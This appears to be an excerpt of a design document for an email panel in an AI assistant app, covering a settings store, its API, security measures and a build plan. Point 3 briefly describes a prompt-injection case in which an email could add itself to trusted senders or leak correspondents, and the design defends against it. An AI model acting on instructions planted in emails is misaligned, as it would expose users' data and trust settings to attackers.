**Ask:** a small per-user, per-app settings store (the user acting on their own data; nothing
operator-level).

1. **Storage:** `client_prefs(user_id, app, key, value_json, updated_at)`, unique on (user, app, key).
   **`app` comes only from the authenticated session's per-app login, never the payload**, so the
   store needs `app_logins`: a session without an app is refused with a code. Values are opaque JSON.
   Caps: key `[a-z0-9._-]` <= 64 bytes; value <= 16 KB; <= 128 keys per user per app; over a cap is a
   coded refusal. Deleted with the user, and with "wipe the user's email state" for `mail.*` keys;
   never returned in admin or all-users listings.
2. **Verbs** (both echo `req`):
   - `client_prefs_get {}` -> `{ success, prefs: { key: value }, updated: { key: epoch_ms } }`.
   - `client_prefs_set { set?: { key: value }, remove?: [key], expect?: { key: epoch_ms | 0 },
     req }` -> `{ success, updated: { key: epoch_ms } }`. `expect` is compare-and-set per key (0 =
     only if absent, which makes a one-time upload atomic); any mismatch refuses the whole call with
     `CONFLICT` and the current `updated` stamps. Without `expect`, last write wins per key.
   - **Push** `client_prefs_changed { keys: [..] }` (names only, never values) to the same user's
     OTHER connections of the same app; they re-read.
3. **Never to the LLM.** `client_prefs` is not exposed to any tool, LLM context or memory extraction;
   only these verbs, on the owner's own connection, touch it. (Otherwise a prompt-injected email could
   add itself to `mail.trusted_senders`, or read who you correspond with.)
4. **Flag** `client_prefs` (signal-map 9.15), advertised only alongside `app_logins`. Without it Aurora
   keeps settings in the browser.
5. **For trusted-sender images:** `email_read` reports the message's From-domain authentication,
   `auth: "pass" | "fail" | "none" | "unknown"`: DMARC alignment from the topmost
   `Authentication-Results` whose authserv-id is the receiving server's (RFC 8601 section 5; any
   sender can add their own header), or DAWN's own check. A message with more than one From (address
   or header) is `fail`. Cheap to ship with 9.13.

Typed rows for trusted senders were considered; nothing DAWN-side reads them yet, so the generic
store holds them as one key, and a typed table can come when a DAWN feature needs them.

## 10. Security and privacy summary

- References, not bodies, go to the assistant; the email is a kinded, wrapped, untrusted row that
  memory never sees; discuss-privately waits for the private flag; refs only from a user's chip.
- The assistant's send/trash confirm is conversational by design (9.0); off-origin images in
  assistant replies don't auto-load (no exfiltration channel).
- HTML is parsed inertly, never moved into the page, walked into escaped markdown, and rendered by an
  email-only Marked + DOMPurify pair with a strict allowlist; only absolute http(s)/mailto URLs, never
  same-origin, never login-tagged; remote images blocked by default (https-only once shown,
  no-referrer). Tracking-pixel removal is best-effort on top of that guarantee.
- No mail in browser storage (notice ids are per account). Per-user browser keys in `USER_KEYS`: the
  mail pref key and the settings map (`dawn.hero.prefs`, which caches trusted senders and the synced
  reading settings).
- Trash is recoverable or refused, never expunged; no permanent delete; no account setup or
  credentials in Aurora.

## 11. Parked: AI summaries

The original idea: each row shows a one-line AI summary instead of the snippet. Parked for cost and
privacy (every incoming mail sent to a model; to a cloud provider if that is the active one). If
revived: DAWN generates summaries in the background with a user-chosen (ideally local) model,
caches them per `(account_id, message_id)` so each mail is summarized once, adds an optional
`summary` field to `Row` (presence-detected, no flag needed), and the row falls back to the snippet
when absent. Summaries must take the email as wrapped untrusted input (9.8) and never act on it. A
reader-view "Summarize" button is the cheaper on-demand variant.

## 12. Open questions

1. Snapshot depth N for the DAWN inbox snapshot (suggest 200, the digest's max).
2. ~~`private:true` on `new_conversation`~~ Agreed: DAWN adds it in P1.4; Aurora then drops the
   eager create + await.

## 13. Build plan: the mock-up is the real panel

The mock-up is the P1 Aurora panel itself, on simulated data, so no work is thrown away.

1. **Foundations:** `makeMovableHandle` + `src/render/resizable.ts`; account color tokens;
   `src/ingest/email.ts` (EmailSource, types,
   error codes).
2. **Email render pipeline:** `src/email/html-to-md.ts` + the email-only Marked/DOMPurify pair, with
   the 6.5 tests (jsdom).
3. **Sim:** `src/ingest/email-sim.ts`: 3 accounts (one read-only), a few hundred generated messages
   incl. real-world HTML (newsletter with tables, receipt, tracking pixels, a lookalike link, an
   injected-instructions email), opaque merged cursors, latency, one flaky account (partial failure
   + an `AUTH_REVOKED` state), periodic `email_changed` (created/updated/destroyed), undo tokens,
   and a `CURSOR_STALE` case. DEV-only dynamic import.
4. **Panel:** `src/email/` per sections 3, 5, 7 (collapsed bar, filter, list, reader, split, toolbar,
   toast, states, a11y, arrival rules).
5. **Wiring:** main.ts source selection, `onDiscuss` -> the conversation chip (the turn can't carry
   `email_refs` until DAWN P1.4, so Send with a chip is held with a "needs a newer DAWN" note),
   `notify` -> notification cards with the email `open` kind.
6. **Not in the mock-up:** P2/P3 buttons (no dead buttons); the chat-renderer image block (4.7) is
   its own change, scheduled before P1.4 ships.
7. tsc, vitest, the review set, then browser verification on :5273 with `?email=sim`
   (`&revoked=1` puts the Work account in the AUTH_REVOKED state). Worth checking in the browser:
   resizing a right-docked panel from its right/bottom edge (Firefox may not apply `:active` after
   the grip's preventDefault, which gates movable's re-dock), and the blur cost with the panel
   resized very large.
